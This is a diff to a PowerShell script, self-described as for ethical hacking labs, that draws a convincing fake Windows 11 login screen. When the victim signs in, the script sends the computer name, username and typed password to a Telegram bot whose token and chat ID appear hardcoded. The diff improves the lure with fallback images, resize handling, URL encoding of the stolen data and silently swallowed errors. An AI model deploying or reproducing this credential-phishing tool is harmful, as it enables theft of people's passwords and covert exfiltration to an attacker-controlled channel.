@@ -1,6 +1,6 @@
 #Made by Deadfire for educational purposes and legal use in ethical hacking labs
 
-# --- TELEGRAM CONFIGURATION, change it for ur self ---
+## --- CONFIGURATION ---
 $telegramToken = '8719343462:AAHrS9Hv_mwUSAfRkoe5yLXu9RXJZlXuto4'
 $telegramChatId = '7587830896'
 # --- END CONFIGURATION ---
@@ -23,19 +23,48 @@ try {
         }
     } catch {}
 
-    # Setup temporary file paths
+    # Use TEMP folder (ALWAYS accessible)
     $tempDir = $env:TEMP
     $bgTemp = Join-Path $tempDir "bg.jpg"
     $profileTemp = Join-Path $tempDir "profile.png"
 
     # Download images
     $webClient = New-Object System.Net.WebClient
-    $webClient.DownloadFile('https://raw.githubusercontent.com/deadfire63/win11-login-assets/main/background.jpg', $bgTemp)
-    $webClient.DownloadFile('https://raw.githubusercontent.com/deadfire63/win11-login-assets/main/profile.png', $profileTemp)
+    try {
+        $webClient.DownloadFile('https://raw.githubusercontent.com/deadfire63/win11-login-assets/main/background.jpg', $bgTemp)
+    } catch {
+        # If download fails, create a solid color background
+        $bgTemp = $null
+    }
+    
+    try {
+        $webClient.DownloadFile('https://raw.githubusercontent.com/deadfire63/win11-login-assets/main/profile.png', $profileTemp)
+    } catch {
+        $profileTemp = $null
+    }
 
-    # Load images
-    $bgImage = [System.Drawing.Image]::FromFile($bgTemp)
-    $profileImage = [System.Drawing.Image]::FromFile($profileTemp)
+    # Load images or create fallbacks
+    $bgImage = if ($bgTemp -and (Test-Path $bgTemp)) { 
+        [System.Drawing.Image]::FromFile($bgTemp) 
+    } else {
+        # Create a solid blue background
+        $bmp = New-Object System.Drawing.Bitmap(1920, 1080)
+        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+        $graphics.Clear([System.Drawing.Color]::FromArgb(255, 0, 120, 215))
+        $graphics.Dispose()
+        $bmp
+    }
+    
+    $profileImage = if ($profileTemp -and (Test-Path $profileTemp)) {
+        [System.Drawing.Image]::FromFile($profileTemp)
+    } else {
+        # Create a default profile icon
+        $bmp = New-Object System.Drawing.Bitmap(140, 140)
+        $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+        $graphics.Clear([System.Drawing.Color]::FromArgb(255, 0, 120, 215))
+        $graphics.Dispose()
+        $bmp
+    }
 
     # --- GUI SETUP ---
 
@@ -72,45 +101,51 @@ try {
     $dateLabel.AutoSize = $true
     $dateLabel.Location = New-Object System.Drawing.Point(60, 110)
     $overlay.Controls.Add($dateLabel)
-     # Bottom right icons panel
-$iconPanel = New-Object System.Windows.Forms.FlowLayoutPanel
-$iconPanel.FlowDirection = 'RightToLeft'
-$iconPanel.Size = New-Object System.Drawing.Size(350, 40)
-$iconPanel.BackColor = [System.Drawing.Color]::Transparent
-$iconPanel.Location = New-Object System.Drawing.Point($form.ClientSize.Width - 370, $form.ClientSize.Height - 70)
-$overlay.Controls.Add($iconPanel)
 
-# Network icon
-$networkLabel = New-Object System.Windows.Forms.Label
-$networkLabel.Text = '📶'
-$networkLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
-$networkLabel.ForeColor = 'White'
-$networkLabel.AutoSize = $true
-$iconPanel.Controls.Add($networkLabel)
+    # Bottom icons panel
+    $iconPanel = New-Object System.Windows.Forms.FlowLayoutPanel
+    $iconPanel.FlowDirection = 'RightToLeft'
+    $iconPanel.Size = New-Object System.Drawing.Size(350, 40)
+    $iconPanel.BackColor = [System.Drawing.Color]::Transparent
+    $iconPanel.Location = New-Object System.Drawing.Point($form.ClientSize.Width - 370, $form.ClientSize.Height - 70)
+    $overlay.Controls.Add($iconPanel)
+    
+    $form.Add_Resize({
+        $iconPanel.Location = New-Object System.Drawing.Point($form.ClientSize.Width - 370, $form.ClientSize.Height - 70)
+    })
 
-# Sound icon
-$soundLabel = New-Object System.Windows.Forms.Label
-$soundLabel.Text = '🔊'
-$soundLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
-$soundLabel.ForeColor = 'White'
-$soundLabel.AutoSize = $true
-$iconPanel.Controls.Add($soundLabel)
+    # Network icon
+    $networkLabel = New-Object System.Windows.Forms.Label
+    $networkLabel.Text = '📶'
+    $networkLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
+    $networkLabel.ForeColor = 'White'
+    $networkLabel.AutoSize = $true
+    $iconPanel.Controls.Add($networkLabel)
 
-# Battery icon
-$batteryLabel = New-Object System.Windows.Forms.Label
-$batteryLabel.Text = '🔋'
-$batteryLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
-$batteryLabel.ForeColor = 'White'
-$batteryLabel.AutoSize = $true
-$iconPanel.Controls.Add($batteryLabel)
+    # Sound icon
+    $soundLabel = New-Object System.Windows.Forms.Label
+    $soundLabel.Text = '🔊'
+    $soundLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
+    $soundLabel.ForeColor = 'White'
+    $soundLabel.AutoSize = $true
+    $iconPanel.Controls.Add($soundLabel)
 
-# Short date
-$dateShortLabel = New-Object System.Windows.Forms.Label
-$dateShortLabel.Text = Get-Date -Format 'M/d'
-$dateShortLabel.Font = New-Object System.Drawing.Font('Segoe UI', 12)
-$dateShortLabel.ForeColor = 'White'
-$dateShortLabel.AutoSize = $true
-$iconPanel.Controls.Add($dateShortLabel)    
+    # Battery icon
+    $batteryLabel = New-Object System.Windows.Forms.Label
+    $batteryLabel.Text = '🔋'
+    $batteryLabel.Font = New-Object System.Drawing.Font('Segoe UI', 14)
+    $batteryLabel.ForeColor = 'White'
+    $batteryLabel.AutoSize = $true
+    $iconPanel.Controls.Add($batteryLabel)
+
+    # Short date
+    $dateShortLabel = New-Object System.Windows.Forms.Label
+    $dateShortLabel.Text = Get-Date -Format 'M/d'
+    $dateShortLabel.Font = New-Object System.Drawing.Font('Segoe UI', 12)
+    $dateShortLabel.ForeColor = 'White'
+    $dateShortLabel.AutoSize = $true
+    $iconPanel.Controls.Add($dateShortLabel)
+
     # Login Container
     $loginContainer = New-Object System.Windows.Forms.Panel
     $loginContainer.Size = New-Object System.Drawing.Size(420, 500)
@@ -118,6 +153,11 @@ $iconPanel.Controls.Add($dateShortLabel)
     $overlay.Controls.Add($loginContainer)
     $loginContainer.Left = ($form.ClientSize.Width - $loginContainer.Width) / 2
     $loginContainer.Top = ($form.ClientSize.Height - $loginContainer.Height) / 2
+    
+    $form.Add_Resize({
+        $loginContainer.Left = ($form.ClientSize.Width - $loginContainer.Width) / 2
+        $loginContainer.Top = ($form.ClientSize.Height - $loginContainer.Height) / 2
+    })
 
     # Profile Picture
     $profilePic = New-Object System.Windows.Forms.PictureBox
@@ -136,6 +176,33 @@ $iconPanel.Controls.Add($dateShortLabel)
     $nameLabel.Location = New-Object System.Drawing.Point(0, 180)
     $nameLabel.TextAlign = 'MiddleCenter'
     $loginContainer.Controls.Add($nameLabel)
+    
+    # Options panel (Windows 11 style)
+    $optionsPanel = New-Object System.Windows.Forms.Panel
+    $optionsPanel.Size = New-Object System.Drawing.Size(380, 45)
+    $optionsPanel.Location = New-Object System.Drawing.Point(20, 240)
+    $optionsPanel.BackColor = [System.Drawing.Color]::FromArgb(30, 255, 255, 255)
+    $loginContainer.Controls.Add($optionsPanel)
+
+    # PIN label
+    $pinLabel = New-Object System.Windows.Forms.Label
+    $pinLabel.Text = 'PIN'
+    $pinLabel.Font = New-Object System.Drawing.Font('Segoe UI', 12)
+    $pinLabel.ForeColor = 'White'
+    $pinLabel.Size = New-Object System.Drawing.Size(100, 45)
+    $pinLabel.Location = New-Object System.Drawing.Point(15, 0)
+    $pinLabel.TextAlign = 'MiddleLeft'
+    $optionsPanel.Controls.Add($pinLabel)
+
+    # Sign-in options
+    $optionsLabel = New-Object System.Windows.Forms.Label
+    $optionsLabel.Text = 'Sign-in options'
+    $optionsLabel.Font = New-Object System.Drawing.Font('Segoe UI', 12)
+    $optionsLabel.ForeColor = '#AAAAAA'
+    $optionsLabel.Size = New-Object System.Drawing.Size(140, 45)
+    $optionsLabel.Location = New-Object System.Drawing.Point(220, 0)
+    $optionsLabel.TextAlign = 'MiddleRight'
+    $optionsPanel.Controls.Add($optionsLabel)
     
     # Password Field
     $passwordBox = New-Object System.Windows.Forms.TextBox
@@ -158,16 +225,18 @@ $iconPanel.Controls.Add($dateShortLabel)
     $forgotPinLabel.TextAlign = 'MiddleCenter'
     $forgotPinLabel.Cursor = 'Hand'
     $loginContainer.Controls.Add($forgotPinLabel)
-# Other user link
-$otherUserLabel = New-Object System.Windows.Forms.Label
-$otherUserLabel.Text = 'Other user'
-$otherUserLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11)
-$otherUserLabel.ForeColor = '#AAAAAA'
-$otherUserLabel.Size = New-Object System.Drawing.Size(420, 30)
-$otherUserLabel.Location = New-Object System.Drawing.Point(0, 460)
-$otherUserLabel.TextAlign = 'MiddleCenter'
-$otherUserLabel.Cursor = 'Hand'
-$loginContainer.Controls.Add($otherUserLabel)
+
+    # "Other user" Link
+    $otherUserLabel = New-Object System.Windows.Forms.Label
+    $otherUserLabel.Text = 'Other user'
+    $otherUserLabel.Font = New-Object System.Drawing.Font('Segoe UI', 11)
+    $otherUserLabel.ForeColor = '#AAAAAA'
+    $otherUserLabel.Size = New-Object System.Drawing.Size(420, 30)
+    $otherUserLabel.Location = New-Object System.Drawing.Point(0, 400)
+    $otherUserLabel.TextAlign = 'MiddleCenter'
+    $otherUserLabel.Cursor = 'Hand'
+    $loginContainer.Controls.Add($otherUserLabel)
+
     # Hidden Button for submission
     $submitButton = New-Object System.Windows.Forms.Button
     $submitButton.Size = New-Object System.Drawing.Size(1, 1)
@@ -188,7 +257,11 @@ $loginContainer.Controls.Add($otherUserLabel)
         
         # Send data to Telegram
         $message = "WINDOWS 11 LOGIN`nPC: $computerName`nUser: $username`nDisplay: $displayName`nPassword: $password`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-        $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$telegramChatId&text=$message"
+        
+        # URL encode the message
+        $messageEncoded = [System.Uri]::EscapeDataString($message)
+        $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$telegramChatId&text=$messageEncoded"
+        
         try {
             Invoke-RestMethod -Uri $telegramUrl -Method Get -ErrorAction Stop | Out-Null
         } catch {}
@@ -210,8 +283,12 @@ $loginContainer.Controls.Add($otherUserLabel)
         $bgImage.Dispose()
         $profileImage.Dispose()
         Start-Sleep -Seconds 1
-        Remove-Item $bgTemp -Force -ErrorAction SilentlyContinue
-        Remove-Item $profileTemp -Force -ErrorAction SilentlyContinue
+        if ($bgTemp -and (Test-Path $bgTemp)) {
+            Remove-Item $bgTemp -Force -ErrorAction SilentlyContinue
+        }
+        if ($profileTemp -and (Test-Path $profileTemp)) {
+            Remove-Item $profileTemp -Force -ErrorAction SilentlyContinue
+        }
     })
     
     # Set focus on password box when form is shown
@@ -223,5 +300,5 @@ $loginContainer.Controls.Add($otherUserLabel)
     [System.Windows.Forms.Application]::Run($form)
 
 } catch {
-    # Silently fail
+    # Silently fail - don't show errors
 }
